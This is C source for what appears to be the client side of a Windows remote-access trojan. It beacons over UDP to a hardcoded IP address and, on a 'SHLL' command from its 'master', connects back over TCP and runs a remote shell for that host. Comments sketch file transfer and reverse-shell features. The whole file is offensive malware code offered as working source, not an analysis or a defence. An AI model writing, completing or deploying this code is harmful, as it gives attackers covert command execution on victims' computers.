#include "includes.h"

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")




SOCKET* __sock_TCP = NULL;
SOCKET* __sock_UDP = NULL;
PROCESS_INFORMATION* __child = NULL;
HANDLE __heartbeat = INVALID_HANDLE_VALUE;

void HandleCTRL_C(int sg){
    #ifdef DEBUG
    if (__sock_TCP && (*__sock_TCP != INVALID_SOCKET))
        closesocket(*__sock_TCP);
    if (__sock_UDP && (*__sock_UDP != INVALID_SOCKET))
        closesocket(*__sock_UDP);
    if (__child)
        TerminateProcess(__child->hProcess, 0);
    if (__heartbeat)
        TerminateThread(__heartbeat, 0);
    WSACleanup();
    exit(0);
    #endif

}

int __cdecl main(int argc, char **argv)
{
    int iResult, sig;
    char buf[1024];
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET sock_tcp = INVALID_SOCKET;
    SOCKET sock_udp = INVALID_SOCKET;
    int INIT = 0;
    SOCKADDR_IN sa;
    PROCESS_INFORMATION pi;
    struct addrinfo* tcp_inf = NULL;
    __sock_TCP = &sock_tcp;
    __sock_UDP = &sock_udp;
    __child = &pi;
    srand(time(NULL));
    signal(SIGINT, HandleCTRL_C);
    if (InitSetup() < 0){
        return 1;
    }

    if (SetupClientUDP(&sock_udp)< 0)
    {
        return 1;
    }
    if (GenerateSockaddrin(&sa, "45.143.93.119", DEFAULT_PORT_UDP) < 0){
        return 1;
    }

    // if (SetupServerUDP(&socku_s, ad_info.sin_port) < 0){
    //     DBGLG("Server set up failed: ", WSAGetLastError());
    //     closesocket(sock_udp);
    //     return 1;
    // }

    // iResult = HeartBeat("45.143.93.119", &__heartbeat);
    // printf("Initial heartbeat sent\n");
    // DBGLG("thread started: ", iResult);


    
    if (InitServer(sock_udp, &sa) <0){
        exit(1);
    }

    /* TODO: Start a thread for heartbeating [UDPIpSetup, Connect, HeartBeat, Close]*/
    while (1){
        // MAIN EVENT LOOP
        eventloop:
        switch ( HeartBeat(sock_udp, &sa)){
            case _SIG_INIT:
                DBGLG("Got INIT\n");
            /* INITIALIZE and should not be handled on client side*/
                break;
            case _SIG_COUT:
                DBGLG("Got COUT\n");
            /* File transfer, presumably uploading to client */
                break;
            case _SIG_SHLL:
            /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
                DBGLG("Got SHLL\n");
                iResult = IpSetupTCP(&tcp_inf, "45.143.93.119");
                iResult &= Connect(&sock_tcp, tcp_inf);
                if (iResult < 0){
                    perror("failed at connecting");
                }
                DBGLG("TCP success starting shell\n");
                Shell(&pi, sock_tcp);
                closesocket(sock_tcp);
                DBGLG("Closing shell\n");
                break;
            case _SIG_FILE:
                DBGLG("Got FILE\n");
            /* Reverse shell */
                break;
            case _SIG_HRBT:
                DBGLG("Got HRBT\n");
            /* Heartbeat */
                break;
            default:
                DBGLG("Got retarded data\n");
                break;
        }
    }

    WSACleanup();
    return 0;

}
